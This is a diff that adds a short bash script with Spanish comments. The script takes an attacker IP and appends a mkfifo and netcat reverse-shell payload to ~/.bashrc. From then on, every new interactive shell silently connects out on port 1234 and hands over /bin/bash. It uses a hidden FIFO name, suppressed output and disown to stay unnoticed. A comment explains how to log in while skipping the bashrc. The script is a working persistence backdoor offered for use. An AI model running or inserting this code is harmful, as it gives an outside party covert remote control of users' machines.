@@ -1,0 +1,30 @@
+#!/usr/bin/env bash
+
+#Para entrar sin bashrc a una sesion:
+#ssh -t usuario@HOST 'bash --noprofile --norc -i'
+
+
+# Uso: ./script.sh <IP>
+# Agrega la reverse shell a ~/.bashrc
+
+IP="$1"
+PORT=1234
+FIFO="/tmp/.n64"
+
+if [[ -z "$IP" ]]; then
+  echo "Uso: $0 <IP>"
+  exit 1
+fi
+
+PAYLOAD="( rm -f $FIFO; mkfifo $FIFO; cat $FIFO | /bin/bash -i 2>&1 | nc $IP $PORT > $FIFO ) >/dev/null 2>&1 & disown"
+
+# Añadir al final de ~/.bashrc si no existe
+if ! grep -Fxq "$PAYLOAD" ~/.bashrc; then
+  echo "$PAYLOAD" >> ~/.bashrc
+  echo "Payload agregado a ~/.bashrc con IP $IP y puerto $PORT"
+else
+  echo "Ya existe en ~/.bashrc"
+fi
+
+
+
